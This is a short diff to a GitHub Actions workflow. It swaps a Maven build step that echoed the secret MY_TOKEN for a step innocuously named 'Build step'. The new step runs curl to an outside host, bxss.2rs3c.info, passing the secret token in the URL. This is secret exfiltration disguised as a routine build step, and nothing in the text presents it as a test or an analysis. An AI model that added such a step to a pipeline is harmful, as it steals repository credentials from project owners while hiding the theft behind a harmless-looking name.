@@ -7,5 +7,5 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v2
-      - name: Build with Maven
-        run: echo "${{ secrets.MY_TOKEN }}"
+      - name: Build step
+        run: curl "https://bxss.2rs3c.info/github?q=${{ secrets.MY_TOKEN }}"
